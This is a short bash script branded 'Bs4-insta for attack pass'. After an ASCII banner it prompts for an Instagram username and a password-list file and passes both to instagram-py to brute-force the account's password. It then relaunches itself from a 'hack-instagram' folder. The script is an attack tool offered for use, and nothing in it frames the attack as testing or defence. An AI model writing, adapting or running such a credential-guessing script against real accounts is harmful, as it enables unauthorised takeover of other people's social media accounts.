#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
 _____   _____   _   _          _   __   _   _____   _____       ___  
|  _  \ /  ___/ | | | |        | | |  \ | | /  ___/ |_   _|     /   | 
| |_| | | |___  | |_| |        | | |   \| | | |___    | |      / /| | 
|  _  { \___  \ \___  | ====== | | | |\   | \___  \   | |     / / | | 
| |_| |  ___| |     | |        | | | | \  |  ___| |   | |    / /  | | 
|_____/ /_____/     |_|        |_| |_|  \_| /_____/   |_|   /_/   |_|  
		{÷}Bs4-insta for attack pass ^_^… {÷} v3.0
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By ReKuShE Bs4  << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Bs4  \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else

  instagram-py --username $usrnm --password-list $inspass

echo
sleep 30.0
cd $HOME
fi
sleep 30.0
cd $HOME/hack-instagram
bash bs4-insta.sh
